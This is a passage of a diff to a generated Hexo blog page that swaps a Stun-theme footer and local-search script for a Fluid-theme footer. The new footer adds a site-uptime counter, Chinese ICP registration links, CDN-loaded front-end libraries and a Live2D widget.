+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    <!--《添加网站运行时间 -->
+<br/>
 
-                  var hitWordEnd = hit.index + hit.word.length;
-                  result += text.slice(startIndex, hit.index);
-                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
-                  startIndex = hitWordEnd;
-                });
-                result += text.slice(startIndex, endIndex);
-                return result;
-              }
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+var now = new Date(); 
 
-              var postData = {};
-              // 文章总的搜索权重
-              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
-              // 标记匹配关键词后的标题
-              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
-              // 标记匹配关键词后的内容
-              var postContent;
-              // 显示内容的长度
-              var SHOW_WORD_LENGTH = 200;
-              // 命中关键词前的字符显示长度
-              var SHOW_WORD_FRONT_LENGTH = 20;
-              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+function createtime() {
+    //此处修改你的建站时间或者网站上线时间
+    var grt = new Date('03/01/2020 8:00:00');
+    now.setTime(now.getTime() + 250);
+    days = (now - grt) / 1000 / 60 / 60 / 24;
 
-              // 截取匹配的第一个字符，前后共 200 个字符来显示
-              if (contentHitSlice.length > 0) {
-                var firstIndex = contentHitSlice[0].index;
-                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
-                var end = firstIndex + SHOW_WORD_END_LENGTH;
-                postContent = highlightKeyword(content, contentHitSlice, start, end);
-              } else { // 未匹配到内容，直接截取前 200 个字符来显示
-                postContent = content.slice(0, SHOW_WORD_LENGTH);
-              }
-              postData.title = postTitle;
-              postData.content = postContent;
-              postData.url = postURL;
-              postData.weight = postWeight;
-              matchPosts.push(postData);
-            }
-          });
-        }
-
-        var resultInnerHtml = '';
-        if (matchPosts.length) {
-          // 按权重递增的顺序排序，使权重大的优先显示
-          matchPosts.sort(function (left, right) {
-            return right.weight - left.weight;
-          });
-          resultInnerHtml += '<ul>';
-          matchPosts.forEach(function (post) {
-            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
-            resultInnerHtml += post.title;
-            resultInnerHtml += '</a><div class="search-results-content">';
-            resultInnerHtml += post.content;
-            resultInnerHtml += '</div></li>';
-          });
-          resultInnerHtml += '</ul>';
-        } else {
-          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
-        }
-        $result.html(resultInnerHtml);
-      };
-      $input.on('input', searchPost);
-      $input.on('keyup', function (e) {
-        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
-          searchPost();
-        }
-      });
+    dnum = Math.floor(days);
+    hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
+    hnum = Math.floor(hours);
+    if (String(hnum).length == 1) {
+        hnum = "0" + hnum;
     }
-  });
+    minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
+    mnum = Math.floor(minutes);
+    if (String(mnum).length == 1) {
+        mnum = "0" + mnum;
+    }
+    seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+    snum = Math.round(seconds);
+    if (String(snum).length == 1) {
+        snum = "0" + snum;
+    }
+    document.getElementById("timeDate").innerHTML = " 本站已安全运行 " + dnum + " 天 ";
+    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
 }
+setInterval("createtime()", 250);
+</script>
 
-function closeSearch () {
-  $('body').css({ overflow: 'auto' });
-  $('.search-popup').css({ display: 'none' });
-  $('.search-mask').css({ display: 'none' });
-}
+<!-- 添加网站运行时间》-->
+  </div>
+  
 
-window.addEventListener('DOMContentLoaded', function () {
-  Stun.utils.pjaxReloadLocalSearch = function () {
-    $('.header-nav-search').on('click', function (e) {
-      e.stopPropagation();
-      $('body').css('overflow', 'hidden');
-      $('.search-popup')
-        .velocity('stop')
-        .velocity('transition.expandIn', {
-          duration: 300,
-          complete: function () {
-            $('.search-popup input').focus();
-          }
-        });
-      $('.search-mask')
-        .velocity('stop')
-        .velocity('transition.fadeIn', {
-          duration: 300
-        });
+  
 
-      initSearch();
-    });
-    $('.search-mask, .search-close').on('click', function () {
-      closeSearch();
-    });
-    $(document).on('keydown', function (e) {
-      // Escape <=> 27
-      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
-        closeSearch();
-      }
-    });
-  };
+    <div class="footer-center">
+         <!--添加工信备案号-->
+         <!--img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png"-->
+         <a href="http://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">豫ICP备2021010365号-1</a>
+         <br/>
+         <!--添加公安备案号-->
+         <!--img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png"-->
+         <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=41040202000160"  style="color:#f72b07" target="_blank">豫公网安备41040202000160号</a>
+      </div>
+  
+</footer>
 
-  Stun.utils.pjaxReloadLocalSearch();
-}, false);
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
 
-function safeOpenUrl(url) {
-  var newTab = window.open();
-  newTab.opener = null;
-  newTab.location = url;
-}
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
-function extSearch(engine) {
-  var engines = {
-    google: 'https://www.google.com/search?q=',
-    bing: 'https://cn.bing.com/search?q=',
-    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
-  };
-  var host = window.location.host;
-  var query = $('.search-input input').val().toLowerCase().trim();
-  var uri = engines[engine] + query + ' site:' + host;
 
-  if (query) {
-    safeOpenUrl(uri);
-  } else {
-    Stun.utils.popAlert('warning', '请输入字符');
-  }
-}
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-var assistSearchList = window.CONFIG.assistSearch;
+<!-- Plugins -->
 
-if (Array.isArray(assistSearchList)) {
-  assistSearchList.forEach(function (name) {
-    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
-      extSearch(name);
-    }, false);
-  });
-}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/search.json";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>
+<script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
